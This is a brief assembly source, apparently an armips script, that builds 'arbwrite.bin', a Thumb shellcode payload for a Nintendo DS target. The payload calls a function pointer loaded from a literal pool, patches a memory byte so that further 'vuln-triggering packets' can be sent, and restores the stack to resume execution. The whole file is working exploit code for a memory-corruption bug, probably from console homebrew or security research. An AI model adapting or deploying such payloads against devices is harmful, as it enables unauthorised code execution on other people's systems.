.nds


.create "arbwrite.bin",0x20002440

.thumb

.org 0x20002440
	add r4, pc, #0x44
	ldmia r4!, {r0-r3}
	blx r3
	; the following is needed so that we can send more vuln-triggering packets
	ldr r0, =0x20001EB2
	mov r1, #0x10
	strb r1, [r0]
	add sp, #0x54
	pop {r4-r7,pc}

	.pool

.Close
